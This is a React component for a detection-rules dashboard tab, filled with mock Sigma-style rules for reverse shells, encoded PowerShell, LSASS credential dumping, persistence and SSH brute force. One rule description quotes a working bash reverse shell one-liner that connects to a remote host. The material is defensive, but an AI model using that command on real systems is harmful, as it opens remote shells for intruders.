import {
  ConstructionOutlined as ConstructionIcon,
  Rule as RuleIcon,
} from '@mui/icons-material';
import {
  Box,
  Chip,
  Stack,
  Typography,
} from '@mui/material';
import React, { useCallback, useState } from 'react';
import { useTranslation } from '../../../hooks/useTranslation';
import { DetectionRuleDetail, type DetectionRuleData } from '../components/DetectionRuleDetail';
import { DetectionRuleList, type DetectionRuleListItem } from '../components/DetectionRuleList';

// ── 목업 데이터 ──────────────────────────────────────────────────────────────

const MOCK_RULES: DetectionRuleData[] = [
  {
    id: 'rule-8f1a9c',
    name: 'Linux Reverse Shell Indicator',
    logType: 'Linux System Logs',
    description: "Detects a bash connecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
    lastUpdated: '2021-10-15T15:00:00.000Z',
    author: 'Florian Roth (Nextron Systems)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'critical',
    tags: ['attack.execution', 'attack.t1059.004'],
    references: [
      'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md',
    ],
    falsePositives: ['Unknown'],
    ruleStatus: 'test',
    enabled: true,
    detection: `selection:
  Image|endswith: /bin/bash
filter:
  DestinationIp:
    - 127.0.0.1
    - 0.0.0.0
condition: selection and not filter`,
  },
  {
    id: 'rule-3b7e2d',
    name: 'PowerShell Encoded Command Execution',
    logType: 'Windows Process Events',
    description: 'Detects execution of PowerShell with encoded command-line arguments that may indicate obfuscation techniques used by attackers.',
    lastUpdated: '2024-06-22T10:30:00.000Z',
    author: 'Florian Roth (Nextron Systems)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'critical',
    tags: ['attack.execution', 'attack.t1059.001', 'attack.defense_evasion', 'attack.t1027'],
    references: [
      'https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe',
    ],
    falsePositives: ['Legitimate administrative scripts using encoded commands'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  CommandLine|contains:
    - '-enc '
    - '-EncodedCommand '
    - '-e '
  Image|endswith: \\powershell.exe
condition: selection`,
  },
  {
    id: 'rule-a4c510',
    name: 'Credential Dump via LSASS Memory Access',
    logType: 'Windows Sysmon Logs',
    description: 'Detects access to LSASS process memory which is commonly used in credential dumping attacks like Mimikatz.',
    lastUpdated: '2025-01-10T08:00:00.000Z',
    author: 'Roberto Rodriguez (@Cyb3rWard0g)',
    source: 'Community',
    license: 'Detection Rule License (DRL)',
    severity: 'critical',
    tags: ['attack.credential_access', 'attack.t1003.001'],
    references: [
      'https://attack.mitre.org/techniques/T1003/001/',
      'https://github.com/gentilkiwi/mimikatz',
    ],
    falsePositives: ['Legitimate security tools that interact with LSASS', 'Windows Defender'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  TargetImage|endswith: \\lsass.exe
  GrantedAccess|contains:
    - '0x1010'
    - '0x1038'
filter:
  SourceImage|endswith:
    - \\wmiprvse.exe
    - \\taskmgr.exe
condition: selection and not filter`,
  },
  {
    id: 'rule-d62f8b',
    name: 'Registry Run Key Persistence',
    logType: 'Windows Registry Events',
    description: 'Detects modification of HKCU/HKLM Run and RunOnce registry keys for establishing persistent execution at user login.',
    lastUpdated: '2023-09-05T12:00:00.000Z',
    author: 'Markus Neis',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'medium',
    tags: ['attack.persistence', 'attack.t1547.001'],
    references: ['https://attack.mitre.org/techniques/T1547/001/'],
    falsePositives: ['Legitimate software installation', 'System administration tools'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  TargetObject|contains:
    - \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    - \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
  EventType: SetValue
filter:
  Image|endswith:
    - \\msiexec.exe
    - \\software_reporter_tool.exe
condition: selection and not filter`,
  },
  {
    id: 'rule-71ea43',
    name: 'Lateral Movement via PsExec',
    logType: 'Windows Process Events',
    description: 'Detects usage of PsExec or PsExec-like tools to execute commands on remote systems for lateral movement.',
    lastUpdated: '2024-03-18T09:15:00.000Z',
    author: 'Thomas Patzke',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'high',
    tags: ['attack.lateral_movement', 'attack.t1570', 'attack.t1021.002'],
    references: [
      'https://attack.mitre.org/techniques/T1570/',
      'https://docs.microsoft.com/en-us/sysinternals/downloads/psexec',
    ],
    falsePositives: ['Legitimate administrative use of PsExec'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection_service:
  PipeName: \\PSEXESVC
selection_process:
  Image|endswith: \\PSEXESVC.exe
  ParentImage|endswith: \\services.exe
condition: selection_service or selection_process`,
  },
  {
    id: 'rule-5cf902',
    name: 'Suspicious Outbound DNS over HTTPS',
    logType: 'Network Firewall Logs',
    description: 'Detects DNS-over-HTTPS connections to known public DoH providers that may be used to bypass DNS monitoring.',
    lastUpdated: '2024-11-01T14:00:00.000Z',
    author: 'Florian Roth (Nextron Systems)',
    source: 'Community',
    license: 'Detection Rule License (DRL)',
    severity: 'medium',
    tags: ['attack.command_and_control', 'attack.t1071.001', 'attack.t1573'],
    references: [
      'https://attack.mitre.org/techniques/T1071/001/',
    ],
    falsePositives: ['Legitimate use of DoH by browser or OS-level settings'],
    ruleStatus: 'test',
    enabled: false,
    detection: `selection:
  DestinationPort: 443
  DestinationHostname|endswith:
    - dns.google
    - cloudflare-dns.com
    - dns.quad9.net
    - doh.opendns.com
condition: selection`,
  },
  {
    id: 'rule-e89b17',
    name: 'Scheduled Task Created via CLI',
    logType: 'Windows Process Events',
    description: 'Detects creation of scheduled tasks via command-line utilities which may indicate persistence or privilege escalation.',
    lastUpdated: '2025-02-14T11:30:00.000Z',
    author: 'Florian Roth (Nextron Systems)',
    source: 'Standard',
    license: 'Detection Rule License (DRL)',
    severity: 'high',
    tags: ['attack.persistence', 'attack.execution', 'attack.t1053.005'],
    references: ['https://attack.mitre.org/techniques/T1053/005/'],
    falsePositives: ['Legitimate system administration', 'Software installation scripts'],
    ruleStatus: 'stable',
    enabled: true,
    detection: `selection:
  Image|endswith: \\schtasks.exe
  CommandLine|contains: /create
filter:
  User|contains: SYSTEM
  ParentImage|endswith:
    - \\setup.exe
    - \\msiexec.exe
condition: selection and not filter`,
  },
  {
    id: 'rule-2af4d6',
    name: 'SSH Brute Force Attempt',
    logType: 'Linux Auth Logs',
    description: 'Detects multiple failed SSH login attempts from the same source IP within a short time window indicating brute force activity.',
    lastUpdated: '2024-08-20T16:45:00.000Z',
    author: 'Daniil Yugoslavskiy',
    source: 'Community',
    license: 'Detection Rule License (DRL)',
    severity: 'high',
    tags: ['attack.credential_access', 'attack.t1110.001'],
    references: ['https://attack.mitre.org/techniques/T1110/001/'],
    falsePositives: ['Misconfigured automation tools', 'Users forgetting passwords'],
    ruleStatus: 'test',
    enabled: false,
    detection: `selection:
  service: sshd
  action: failed
timeframe: 5m
condition: selection | count(source_ip) > 10`,
  },
];

const toListItems = (rules: DetectionRuleData[]): DetectionRuleListItem[] =>
  rules.map(({ id, name, severity, logType, tags, enabled }) => ({ id, name, severity, logType, tags, enabled }));

// ── 메인 컴포넌트 ─────────────────────────────────────────────────────────────

const DetectionRuleTab: React.FC = () => {
  const { t } = useTranslation();
  const [selectedRuleId, setSelectedRuleId] = useState<string | null>(null);
  const [rules, setRules] = useState(MOCK_RULES);

  const handleToggleEnabled = useCallback((ruleId: string) => {
    setRules((prev) => prev.map((r) => r.id === ruleId ? { ...r, enabled: !r.enabled } : r));
  }, []);

  const [listWidth, setListWidth] = useState(320);
  const isResizing = React.useRef(false);

  const handleMouseDown = useCallback(() => {
    isResizing.current = true;
    document.body.style.cursor = 'col-resize';
    document.body.style.userSelect = 'none';

    const handleMouseMove = (e: MouseEvent) => {
      if (!isResizing.current) return;
      const containerLeft = document.getElementById('detection-master-detail')?.getBoundingClientRect().left ?? 0;
      const newWidth = e.clientX - containerLeft;
      setListWidth(Math.max(200, Math.min(600, newWidth)));
    };

    const handleMouseUp = () => {
      isResizing.current = false;
      document.body.style.cursor = '';
      document.body.style.userSelect = '';
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleMouseUp);
    };

    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  }, []);

  const selectedRule = rules.find((r) => r.id === selectedRuleId) ?? null;

  return (
    <Box sx={{ flex: '1 1 0', display: 'flex', flexDirection: 'column', height: '100%', maxHeight: '100%', bgcolor: 'background.default', overflow: 'hidden', p: { xs: 1.5, sm: 2, md: 3 }, minHeight: 0, position: 'relative' }}>

      {/* 상단 타이틀 바 */}
      <Box sx={{ flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1.5 }}>
        <Stack direction="row" alignItems="center" spacing={1}>
          <RuleIcon sx={{ fontSize: 20, color: 'primary.main' }} />
          <Typography variant="h6" sx={{ fontWeight: 'bold', fontSize: '1.1rem' }}>
            {t('detectionRules')}
          </Typography>
          <Chip label={t('heartbeatBeta')} size="small" variant="outlined" color="warning" icon={<ConstructionIcon />}
            sx={{ fontSize: '0.6rem', height: 22 }} />
        </Stack>
      </Box>

      {/* 마스터-디테일 레이아웃 */}
      <Box id="detection-master-detail" sx={{ flex: '1 1 0', display: 'flex', minHeight: 0, overflow: 'hidden' }}>
        <DetectionRuleList
          width={listWidth}
          rules={toListItems(rules)}
          selectedRuleId={selectedRuleId}
          onSelect={setSelectedRuleId}
          onToggleEnabled={handleToggleEnabled}
          loading={false}
          t={t}
        />

        {/* 리사이즈 핸들 */}
        <Box
          onMouseDown={handleMouseDown}
          sx={{
            width: 10,
            flexShrink: 0,
            cursor: 'col-resize',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            '&:hover > div, &:active > div': { bgcolor: 'primary.main' },
          }}
        >
          <Box sx={{ width: 2, height: 40, borderRadius: 1, bgcolor: 'divider', transition: 'background-color 0.2s' }} />
        </Box>

        <DetectionRuleDetail
          rule={selectedRule}
          t={t}
        />
      </Box>
    </Box>
  );
};

export default DetectionRuleTab;
